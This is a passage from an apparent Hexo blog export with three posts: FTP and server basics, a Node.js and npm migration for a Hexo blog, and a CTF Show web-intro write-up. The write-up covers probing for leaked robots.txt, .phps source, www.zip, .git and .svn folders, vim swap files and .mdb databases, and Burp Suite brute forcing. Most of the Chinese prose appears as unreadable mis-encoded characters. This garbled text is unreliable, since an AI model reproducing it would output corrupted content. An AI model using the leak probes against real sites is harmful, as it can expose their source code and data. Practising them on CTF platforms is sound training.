ä¸ä¸‹è½½ï¼‰</p><p>å¯¹äºä¸»æœºå•†ï¼šå¯ä»¥ç”¨FTPå®ç°é™åˆ¶ä¸åŒè™šæ‹Ÿä¸»æœºåˆ†é…ç»™ç”¨æˆ·å¯¹æœåŠ¡å™¨çš„ç®¡ç†æƒé™</p><h3 id="FTPé“¾æ¥æ¨¡å¼"><a href="#FTPé“¾æ¥æ¨¡å¼" class="headerlink" title="FTPé“¾æ¥æ¨¡å¼"></a>FTPé“¾æ¥æ¨¡å¼</h3><h4 id="ä¸»åŠ¨æ¨¡å¼ï¼ˆportæ¨¡å¼"><a href="#ä¸»åŠ¨æ¨¡å¼ï¼ˆportæ¨¡å¼" class="headerlink" title="ä¸»åŠ¨æ¨¡å¼ï¼ˆportæ¨¡å¼)"></a>ä¸»åŠ¨æ¨¡å¼ï¼ˆportæ¨¡å¼)</h4><p>å®¢æˆ·ç«¯å‘é€æ§åˆ¶é“¾æ¥åˆ°æœåŠ¡å™¨çš„FTPç«¯å£ï¼Œä¸€èˆ¬æ˜¯é»˜è®¤è®¾ç½®ä¸º21ï¼Œç„¶åæœåŠ¡å™¨çš„æ•°æ®ç«¯å£20ä¸»åŠ¨å»è¿æ¥ç”¨æˆ·çš„å®¢æˆ·ç«¯n+1çš„æ•°æ®ç«¯å£</p><h4 id="è¢«åŠ¨æ¨¡å¼ï¼ˆpassiveæ¨¡å¼"><a href="#è¢«åŠ¨æ¨¡å¼ï¼ˆpassiveæ¨¡å¼" class="headerlink" title="è¢«åŠ¨æ¨¡å¼ï¼ˆpassiveæ¨¡å¼)"></a>è¢«åŠ¨æ¨¡å¼ï¼ˆpassiveæ¨¡å¼)</h4><p>å®¢æˆ·ç«¯å‘é€æ§åˆ¶é“¾æ¥åˆ°æœåŠ¡å™¨çš„FTPç«¯å£ï¼Œä¸€èˆ¬æ˜¯é»˜è®¤è®¾ç½®ä¸º21ï¼Œå®¢æˆ·ç«¯çš„æ•°æ®ç«¯å£n+1ç«¯å£ï¼Œä¸»åŠ¨é“¾æ¥çš„æœåŠ¡å™¨çš„æ•°æ®20ç«¯å£</p><h3 id="FTPçš„ä¸»è¦ä¿¡æ¯"><a href="#FTPçš„ä¸»è¦ä¿¡æ¯" class="headerlink" title="FTPçš„ä¸»è¦ä¿¡æ¯"></a>FTPçš„ä¸»è¦ä¿¡æ¯</h3><ol><li><p>FTPçš„é“¾æ¥åœ°å€</p></li><li><p>FTPçš„ç™»é™†è´¦å·å’Œå¯†ç </p></li><li><p>FTPçš„è¿æ¥çš„ç«¯å£å·</p><h3 id="å¸¸ç”¨çš„FTPç®¡ç†å·¥å…·"><a href="#å¸¸ç”¨çš„FTPç®¡ç†å·¥å…·" class="headerlink" title="å¸¸ç”¨çš„FTPç®¡ç†å·¥å…·"></a>å¸¸ç”¨çš„FTPç®¡ç†å·¥å…·</h3><p>FileZilla</p><p>flashfxp</p></li></ol><p>è™šæ‹Ÿä¸»æœºï¼š</p><p>FTPä¿¡æ¯åˆ°ä¸»æœºçš„æ§åˆ¶é¢æ¿å»æŸ¥æ‰¾</p><p>æœåŠ¡å™¨ï¼š</p><p>Windowsç³»ç»Ÿï¼šé€šè¿‡è¿œç¨‹æ¡Œé¢å»è¿æ¥</p><p>Linuxç³»ç»Ÿ:é€šè¿‡XSHELLæˆ–è€…æ˜¯PUTTYç­‰é“¾æ¥å·¥å…·ï¼ˆæœåŠ¡å™¨çš„è´¦å·å¯†ç ä¹Ÿæ˜¯FTPä¿¡æ¯ï¼‰</p><p>eCSæœåŠ¡å™¨ï¼š</p><p>ç›´æ¥é€šè¿‡æœåŠ¡å™¨çš„ç®¡ç†å‘˜è´¦å·ç™»é™†ç®¡ç†ä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®æ­å»ºFTPä¿¡æ¯å»ç®¡ç†ï¼ˆå¸¸è§çš„æœåŠ¡ç«¯FTPç®¡ç†å·¥å…·ï¼ŒServ-U,IIS,ossftp)</p><h3 id="é˜²ç«å¢™çš„å¼€å¯ï¼š"><a href="#é˜²ç«å¢™çš„å¼€å¯ï¼š" class="headerlink" title="é˜²ç«å¢™çš„å¼€å¯ï¼š"></a>é˜²ç«å¢™çš„å¼€å¯ï¼š</h3><p>WINDOWS</p><p>Linuxï¼š</p><p>å¼€å¯ï¼šservice iptables start</p><p>å…³é—­ï¼šservice iptables stop</p><p>iptables-I INPUT -p tcp â€“dport 3306 -j ACCEPT</p><p>å…¶ä»–é«˜çº§è®¾ç½®ï¼ˆphpç‰ˆæœ¬ï¼Œç½‘ç«™é»˜è®¤é¦–é¡µï¼Œ404ï¼Œ301ï¼‰</p><p> æ•°æ®åº“å¤‡ä»½</p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®°å½• </tag>
            
            <tag> äº‘æœåŠ¡å™¨ </tag>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åšå®¢è¿ç§»node.jsæ¢è·¯å¾„npmå®‰è£…åŠæŠ¥é”™é—®é¢˜</title>
      <link href="/archives/1.html"/>
      <url>/archives/1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="åšå®¢è¿ç§»"><a href="#åšå®¢è¿ç§»" class="headerlink" title="åšå®¢è¿ç§»"></a>åšå®¢è¿ç§»</h2><p>å…ˆæŠŠè‡ªå·±blogæ ¹ç›®å½•å¤åˆ¶ä¸€ä»½ï¼Œåˆ é™¤é‡Œé¢çš„node_modulesæ–‡ä»¶å¤¹</p><p>ï¼Œåç»­æ“ä½œå¯ä»¥é‡æ–°ä¸‹è½½è¿‡æ¥ï¼Œç„¶ååœ¨æ–°ç”µè„‘çš„æ“ä½œå’Œhexoåšå®¢æ­å»ºçš„è¿‡ç¨‹ä¸€æ ·</p><h3 id="1-å®‰è£…git"><a href="#1-å®‰è£…git" class="headerlink" title="1.å®‰è£…git"></a>1.å®‰è£…git</h3><p> <a href="https://github.com/git-for-windows/git/releases/download/v2.37.2.windows.2/Git-2.37.2.2-64-bit.exe">https://github.com/git-for-windows/git/releases/download/v2.37.2.windows.2/Git-2.37.2.2-64-bit.exe</a></p><p>è¿™æ˜¯Windowsçš„ä¸‹è½½è·¯å¾„</p><p>gitbashè¾“å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;ç”¨æˆ·åéšæ„&quot;</span><br><span class="line">git config --global user.email  &quot;123456@qq.com&quot; #å¡«å†™githubæ³¨å†Œçš„é‚®ç®±</span><br></pre></td></tr></table></figure><p>æ·»åŠ ç³»ç»Ÿç¯å¢ƒå˜é‡   path</p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20220816132545179.png"></p><h3 id="2-é…ç½®SSH"><a href="#2-é…ç½®SSH" class="headerlink" title="2.é…ç½®SSH"></a>2.é…ç½®SSH</h3><p><a href="https://blog.csdn.net/weixin_42569846/article/details/105808683?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166062730116782388086147%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=166062730116782388086147&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-1-105808683-null-null.142%5Ev40%5Epc_rank_34_2,185%5Ev2%5Econtrol&utm_term=hexo%20github%E9%85%8D%E7%BD%AEssh&spm=1018.2226.3001.4187">å‚è€ƒçš„åšå®¢é“¾æ¥</a></p><h3 id="3ï¼Œnode-jså®‰è£…åŠåˆ‡æ¢è·¯å¾„"><a href="#3ï¼Œnode-jså®‰è£…åŠåˆ‡æ¢è·¯å¾„" class="headerlink" title="3ï¼Œnode.jså®‰è£…åŠåˆ‡æ¢è·¯å¾„"></a>3ï¼Œnode.jså®‰è£…åŠåˆ‡æ¢è·¯å¾„</h3><p>è¿™é‡Œæˆ‘ä¸‹è½½äº†å¥½å‡ æ¬¡ï¼Œæ˜¯å®‰è£…åŒ….msiä¸‹è½½ï¼Œä½†æ˜¯ä¿®æ”¹è·¯å¾„çš„æ—¶å€™ä¸€ç›´å‡ºé”™ï¼Œæœ€åè¿˜æ˜¯é€‰æ‹©.zipä¸‹è½½ï¼Œç›´æ¥è§£å‹åˆ°Dç›˜ï¼Œ</p><p>æˆ‘åˆå®‰è£…çš„æ˜¯å…¶ä»–è¾ƒæ—©çš„ç‰ˆæœ¬ï¼Œè€ƒè™‘åˆ°æ–°ç‰ˆæœ¬ä¸å…¼å®¹é—®é¢˜ï¼Œä¿é™©èµ·è§ï¼Œé€‰æ‹©æ—§ç‰ˆæœ¬  æˆ‘é€‰æ‹©çš„ç‰ˆæœ¬æ˜¯12.16.1</p><p>è¿™æ˜¯node.jsçš„ç‰ˆæœ¬ä¸‹è½½åœ°å€<a href="https://nodejs.org/zh-cn/download/releases/">https://nodejs.org/zh-cn/download/releases/</a></p><p>ä¸‹è½½å®Œç›´æ¥è§£å‹ç¼©åˆ°Dç›˜</p><p>ç„¶ååœ¨æ–‡ä»¶å¤¹é‡Œæ·»åŠ ä¸¤ä¸ªæ–°æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯node_global    å¦ä¸€ä¸ªæ˜¯node_cache</p><blockquote><p>è®¾ç½®å…¨å±€æ¨¡å—çš„å®‰è£…è·¯å¾„åˆ° â€œnode_globalâ€ æ–‡ä»¶å¤¹ï¼Œ<br>è®¾ç½®ç¼“å­˜åˆ° â€œnode_cacheâ€ æ–‡ä»¶å¤¹</p></blockquote><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20220816134145133.png"></p><p>é…ç½®ç”¨æˆ·å˜é‡path</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816140141145.png" style="zoom:80%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816135822031.png"></p><p>æ‰“å¼€ç®¡ç†å‘˜å‘½ä»¤é¢æ¿  è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set prefix &quot;D:\node-v12.16.1-win-x64\node_global(ä½ è‡ªå·±çš„node_globalè·¯å¾„)&quot;</span><br><span class="line">npm config set cache &quot;D:\node-v12.16.1-win-x64\node_cache(ä½ è‡ªå·±çš„)&quot;</span><br></pre></td></tr></table></figure><p><code>npm install gulp -g</code>   å†ä½¿ç”¨è¿™ä¸ªå‘½ä»¤å®‰è£…gulp</p><p><code>npm config list</code>      æŸ¥çœ‹npmé•œåƒæº</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816134732879.png" style="zoom:80%;" /><p>æˆ‘è¿™é‡Œæ˜¾ç¤ºçš„æ˜¯æ·˜å®é•œåƒæºï¼Œå› ä¸ºæˆ‘å·²ç»åˆ‡æ¢äº†</p><p><code>npm config set registry https://registry.npm.taobao.org/</code>    æ¢æºå‘½ä»¤</p><p><code>npm config get registry</code>   éªŒè¯æ¢æºæ˜¯å¦æˆåŠŸï¼ŒæˆåŠŸä¼šæ˜¾ç¤ºä½ çš„æ·˜å®æºåœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220816135212479.png"></p><p><code>npm install hexo-cli -g</code>   å®‰è£…hexo</p><h3 id="4-å°†blogæ–‡ä»¶è½¬ç§»åˆ°æ–°ç”µè„‘"><a href="#4-å°†blogæ–‡ä»¶è½¬ç§»åˆ°æ–°ç”µè„‘" class="headerlink" title="4.å°†blogæ–‡ä»¶è½¬ç§»åˆ°æ–°ç”µè„‘"></a>4.å°†blogæ–‡ä»¶è½¬ç§»åˆ°æ–°ç”µè„‘</h3><p>æ‰“å¼€gitbashæŠŠåˆ æ‰çš„æ–‡ä»¶node_modulesè£…å›æ¥</p><p><code>npm install</code></p><p>å¦‚æœé‡åˆ°æŠ¥é”™é—®é¢˜    </p><blockquote><p>npm ERR! Error while executing: npm ERR! D:\Git\cmd\git.EXE ls-remote -h -t</p><p>åé¢è¿˜æœ‰ä¸€å¤§ä¸²ERR!</p></blockquote><p>ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŠ¥é”™ä¹Ÿæ‰§è¡Œï¼ˆåœ¨ç½‘ä¸Šæ‰¾çš„è§£å†³åŠæ³•ï¼Œæˆ‘é‡åˆ°æ­¤é—®é¢˜è¿™æ ·è§£å†³äº†ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global url.&quot;https://&quot;.insteadOf git://  </span><br><span class="line">npm config set registry https://registry.npm.taobao.org</span><br><span class="line">npm  install</span><br><span class="line">npm run dev</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œåšå®¢è¿ç§»æˆåŠŸ</p><p>å› ä¸ºæ˜¯çº¯å°ç™½å®‰è£…è¿ç§»ï¼Œä¸­é—´é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œæœ€åæ€»ç»“çš„è¿™ä¹ˆå¤šï¼Œæ¯”è¾ƒç²¾ç®€ï¼Œç•™ä¸ªè®°å½•</p>]]></content>
      
      
      <categories>
          
          <category> å®‰è£…è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> node.js </tag>
            
            <tag> æŠ¥é”™ </tag>
            
            <tag> è®°å½• </tag>
            
            <tag> ERR! </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctf Show webå…¥é—¨åˆ·é¢˜è®°å½•</title>
      <link href="/archives/37777.html"/>
      <url>/archives/37777.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="webå…¥é—¨"><a href="#webå…¥é—¨" class="headerlink" title="webå…¥é—¨"></a>webå…¥é—¨</h1><h2 id="ä¿¡æ¯æ³„éœ²ï¼ˆ1â€”17ï¼‰"><a href="#ä¿¡æ¯æ³„éœ²ï¼ˆ1â€”17ï¼‰" class="headerlink" title="ä¿¡æ¯æ³„éœ²ï¼ˆ1â€”17ï¼‰"></a>ä¿¡æ¯æ³„éœ²ï¼ˆ1â€”17ï¼‰</h2><h3 id="web1-ç½‘é¡µ1"><a href="#web1-ç½‘é¡µ1" class="headerlink" title="web1   ç½‘é¡µ1"></a>web1   ç½‘é¡µ1</h3><p>F12æŸ¥çœ‹æºç </p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/1659276869331-929bced5-d4a3-4d3f-a980-c952cdb3daf5.png" alt="" style="zoom:50%;" /><h3 id="web2-ç½‘ç»œ2"><a href="#web2-ç½‘ç»œ2" class="headerlink" title="web2    ç½‘ç»œ2"></a>web2    ç½‘ç»œ2</h3><p>jsç¦ç”¨ï¼Œé™åˆ¶ç½‘é¡µæŸäº›åŠŸèƒ½</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731221921578.png" alt="" style="zoom: 67%;" /><blockquote><p>1ã€æ‰“å¼€Googleæµè§ˆå™¨è®¾ç½®</p><p>2ã€æ‰“å¼€éšç§è®¾ç½®å’Œå®‰å…¨æ€§</p><p>3ã€é€‰æ‹©ç½‘ç«™è®¾ç½®</p><p>4ã€é€‰æ‹©js</p><p>5ã€åœ¨ç¦æ­¢ä¸­æ·»åŠ ç½‘ç«™</p></blockquote><h3 id="web3-ç½‘ç»œ3"><a href="#web3-ç½‘ç»œ3" class="headerlink" title="web3    ç½‘ç»œ3"></a>web3    ç½‘ç»œ3</h3><p>æŠ“åŒ…      burp suiteæŠ“åŒ…</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731223109700.png" alt="" style="zoom:67%;" /><h3 id="web4-ç½‘é¡µ4"><a href="#web4-ç½‘é¡µ4" class="headerlink" title="web4      ç½‘é¡µ4"></a>web4      ç½‘é¡µ4</h3><p>robotsåè®®</p><blockquote><p>robotsåè®®ä¹Ÿç§°çˆ¬è™«åè®®ã€çˆ¬è™«è§„åˆ™ç­‰,æ˜¯æŒ‡ç½‘ç«™å¯å»ºç«‹ä¸€ä¸ªrobots.txtæ–‡ä»¶æ¥å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–,å“ªäº›é¡µé¢ä¸èƒ½æŠ“å–,è€Œæœç´¢å¼•æ“åˆ™é€šè¿‡è¯»å–robots.txtæ–‡ä»¶æ¥è¯†åˆ«è¿™ä¸ªé¡µé¢æ˜¯å¦å…è®¸è¢«æŠ“å–.å¯ä»¥é€šè¿‡è®¿é—®&#x2F;robots.txtï¼Œè·å–ç½‘ç«™ç»“æ„ã€‚</p><p>User-agent: * è¿™é‡Œçš„<em>ä»£è¡¨çš„æ‰€æœ‰çš„æœç´¢å¼•æ“ç§ç±»ï¼Œ</em>æ˜¯ä¸€ä¸ªé€šé…ç¬¦</p><p>Disallow: &#x2F;admin&#x2F; è¿™é‡Œå®šä¹‰æ˜¯ç¦æ­¢çˆ¬å¯»adminç›®å½•ä¸‹é¢çš„ç›®å½•</p><p>Disallow: &#x2F;cgi-bin&#x2F;*.htm ç¦æ­¢è®¿é—®&#x2F;cgi-bin&#x2F;ç›®å½•ä¸‹çš„æ‰€æœ‰ä»¥â€.htmâ€ä¸ºåç¼€çš„URL(åŒ…å«å­ç›®å½•)</p><p>Disallow:&#x2F;ab&#x2F;adc.html ç¦æ­¢çˆ¬å–abæ–‡ä»¶å¤¹ä¸‹é¢çš„adc.htmlæ–‡ä»¶ã€‚</p><p>Allow: &#x2F;cgi-bin&#x2F;ã€€è¿™é‡Œå®šä¹‰æ˜¯å…è®¸çˆ¬å¯»cgi-binç›®å½•ä¸‹é¢çš„ç›®å½•</p><p>Allow: &#x2F;tmp è¿™é‡Œå®šä¹‰æ˜¯å…è®¸çˆ¬å¯»tmpçš„æ•´ä¸ªç›®å½•</p><p>Allow: .htm$ ä»…å…è®¸è®¿é—®ä»¥â€.htmâ€ä¸ºåç¼€çš„URLã€‚</p><p>Allow: .gif$ å…è®¸æŠ“å–ç½‘é¡µå’Œgifæ ¼å¼å›¾ç‰‡</p><p>Sitemap: ç½‘ç«™åœ°å›¾ å‘Šè¯‰çˆ¬è™«è¿™ä¸ªé¡µé¢æ˜¯ç½‘ç«™åœ°å›¾</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731223616449.png" alt="" style="zoom: 67%;" /><img src="http://rgjl0ywr2.hb-bkt.clouddn.com/img/image-20220731223646250.png" alt="" style="zoom:67%;" /><h3 id="web5-ç½‘ç»œ5phps"><a href="#web5-ç½‘ç»œ5phps" class="headerlink" title="web5     ç½‘ç»œ5phps"></a>web5     ç½‘ç»œ5phps</h3><p>PHPSæºç æ³„éœ²       url&#x2F;index.phps</p><blockquote><p>phpæºç æ–‡ä»¶åç¼€ä¸ºphps,å¯é€šè¿‡å°è¯•è®¿é—®&#x2F;index.phpsè¯»å–,æˆ–è€…å°è¯•æ‰«æå·¥å…·æ‰«æè¯»å–.</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220731230146407.png" alt="" style="zoom:67%;" /><h3 id="web6-www-zip"><a href="#web6-www-zip" class="headerlink" title="web6  -www.zip"></a>web6  -<a href="http://www.zip/">www.zip</a></h3>  <img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801133344230.png" alt="" style="zoom:67%;" /><p>çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶åä¸ºfl000g.txt,åœ¨è®¿é—®ä¸€ä¸‹</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801133247537.png" alt="" style="zoom:67%;" /><h3 id="web7-gitæ³„éœ²"><a href="#web7-gitæ³„éœ²" class="headerlink" title="web7   -gitæ³„éœ²"></a>web7   -gitæ³„éœ²</h3><p>gitæ³„éœ²</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801150254107.png" alt="" style="zoom:50%;" /><h3 id="web8-svn"><a href="#web8-svn" class="headerlink" title="web8-svn"></a>web8-svn</h3><p>svnæ³„éœ²</p><blockquote><p>SVNï¼ˆsubversionï¼‰æ˜¯æºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶ï¼Œé€ æˆSVNæºä»£ç æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç®¡ç†å‘˜æ“ä½œä¸è§„èŒƒã€‚â€œåœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ä½†ä¸€äº›ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œä¸æ„¿æ„ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿.svnéšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œé»‘å®¢å¯ä»¥å€ŸåŠ©å…¶ä¸­åŒ…å«çš„ç”¨äºç‰ˆæœ¬ä¿¡æ¯è¿½è¸ªçš„â€˜entriesâ€™æ–‡ä»¶ï¼Œé€æ­¥æ‘¸æ¸…ç«™ç‚¹ç»“æ„ã€‚â€ï¼ˆå¯ä»¥åˆ©ç”¨.svn&#x2F;entriesæ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€svnæœåŠ¡å™¨è´¦å·å¯†ç ç­‰ä¿¡æ¯ï¼‰</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801174659412.png" alt="" style="zoom:67%;" /><h3 id="web9-vim"><a href="#web9-vim" class="headerlink" title="web9-vim"></a>web9-vim</h3><blockquote><p>VIMä¸­çš„swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªä¸´æ—¶äº¤æ¢æ–‡ä»¶ï¼Œç”¨æ¥å¤‡ä»½ç¼“å†²åŒºä¸­çš„å†…å®¹ã€‚å¦‚æœåŸæ–‡ä»¶åæ˜¯dataï¼Œé‚£ä¹ˆswpæ–‡ä»¶åå°±æ˜¯.data.swp</p></blockquote><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801182618408.png" alt="" style="zoom:67%;" /><h3 id="web10-cookie"><a href="#web10-cookie" class="headerlink" title="web10-cookie"></a>web10-cookie</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801182604285.png" alt="" style="zoom:67%;" /><h3 id="web11-åŸŸåè§£æ"><a href="#web11-åŸŸåè§£æ" class="headerlink" title="web11 -åŸŸåè§£æ"></a>web11 -åŸŸåè§£æ</h3><p>åŸŸåéšè—</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801200114629.png" alt="" style="zoom:67%;" /><h3 id="web12-å…¬å¼€ä¿¡æ¯"><a href="#web12-å…¬å¼€ä¿¡æ¯" class="headerlink" title="web12-å…¬å¼€ä¿¡æ¯"></a>web12-å…¬å¼€ä¿¡æ¯</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801201237059.png" alt="" style="zoom:67%;" /><h3 id="web13-æŠ€æœ¯æ–‡æ¡£æ•æ„Ÿä¿¡æ¯"><a href="#web13-æŠ€æœ¯æ–‡æ¡£æ•æ„Ÿä¿¡æ¯" class="headerlink" title="web13-æŠ€æœ¯æ–‡æ¡£æ•æ„Ÿä¿¡æ¯"></a>web13-æŠ€æœ¯æ–‡æ¡£æ•æ„Ÿä¿¡æ¯</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801201447074.png" alt="" style="zoom: 50%;" /><img src="http://rgjl0ywr2.hb-bkt.clouddn.com/img/image-20220801203913768.png" alt="" style="zoom:67%;" /><h3 id="web14-editor"><a href="#web14-editor" class="headerlink" title="web14-editor"></a>web14-editor</h3><p>editorä¿¡æ¯æ³„éœ²</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801211916335.png" alt="" style="zoom:67%;" /><p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801211859490.png"></p><h3 id="web15-é‚®ç®±æ³„éœ²"><a href="#web15-é‚®ç®±æ³„éœ²" class="headerlink" title="web15-é‚®ç®±æ³„éœ²"></a>web15-é‚®ç®±æ³„éœ²</h3><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213810089.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213957724.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801213918398.png" alt="" style="zoom:67%;" /><h3 id="web16-tz-php"><a href="#web16-tz-php" class="headerlink" title="web16-tz.php"></a>web16-tz.php</h3><p>phpæ¢é’ˆ</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801215916599.png" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801220013482.png" alt="" style="zoom:50%;" /><h3 id="web17-å¤‡ä»½SQLæ–‡ä»¶"><a href="#web17-å¤‡ä»½SQLæ–‡ä»¶" class="headerlink" title="web17-å¤‡ä»½SQLæ–‡ä»¶"></a>web17-å¤‡ä»½SQLæ–‡ä»¶</h3><p>backupå¤‡ä»½çš„æ„æ€</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801221311964.png" alt="" style="zoom:67%;" /><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801221333082.png" alt="" style="zoom:67%;" /><h3 id="web18-js"><a href="#web18-js" class="headerlink" title="web18-js"></a>web18-js</h3><p>æ‰“å¼€jsçœ‹æ¸¸æˆæºç æ–‡ä»¶</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801232435495.png" alt="" style="zoom:67%;" /><p>Unicodeç¼–ç </p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220801232753764.png" alt="" style="zoom:67%;" /><p>ctfshow{a0e8f5b4-357f-4277-8442-f05eee266e7a}</p><h3 id="web19-å‰ç«¯å¯†é’¥"><a href="#web19-å‰ç«¯å¯†é’¥" class="headerlink" title="web19-å‰ç«¯å¯†é’¥"></a>web19-å‰ç«¯å¯†é’¥</h3><p>è¿™é‡Œå¾—ä½¿ç”¨postä¼ å‚</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802084909675.png" alt="" style="zoom: 67%;" /><h3 id="web20-mdbæ–‡ä»¶-db-x2F-db-mdb"><a href="#web20-mdbæ–‡ä»¶-db-x2F-db-mdb" class="headerlink" title="web20- mdbæ–‡ä»¶    db&#x2F;db.mdb"></a>web20- mdbæ–‡ä»¶    db&#x2F;db.mdb</h3><p><strong>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±åº“äº†</strong></p><p>url&#x2F;db&#x2F;db.mdb     ä¸‹è½½mdb,æ‰“å¼€</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802103857599.png" alt="" style="zoom:67%;" /><h2 id="çˆ†ç ´-ï¼ˆ21â€”28ï¼‰"><a href="#çˆ†ç ´-ï¼ˆ21â€”28ï¼‰" class="headerlink" title="çˆ†ç ´  ï¼ˆ21â€”28ï¼‰"></a>çˆ†ç ´  ï¼ˆ21â€”28ï¼‰</h2><h3 id="web21-Custom-iterator"><a href="#web21-Custom-iterator" class="headerlink" title="web21   Custom iterator"></a>web21   Custom iterator</h3><p>è€ƒå¯Ÿburp suiteè‡ªå®šä¹‰è¿­ä»£å™¨ï¼ˆ<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">Custom iterator</a>)</p><p><strong><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174122590.png"></strong></p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174154022.png" alt="" style="zoom: 80%;" /><p>è‡ªå®šä¹‰è¿­ä»£åˆ†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†ç”¨æˆ·åadminï¼Œç¬¬äºŒéƒ¨åˆ†ï¼šï¼Œç¬¬ä¸‰éƒ¨åˆ†å¯†ç ï¼Œåˆå› ä¸ºå­˜åœ¨base64è¿™ç§ç¼–ç ï¼Œurlå¯èƒ½ä¼šè¿‡æ»¤ï¼Œæ‰€ä»¥è¦å–æ¶ˆå‹¾é€‰</p><img src="https://cdn.jsdelivr.net/gh/chenyxy/ljr/img/image-20220802174407170.png" alt="" style="zoom:67%;" /><img 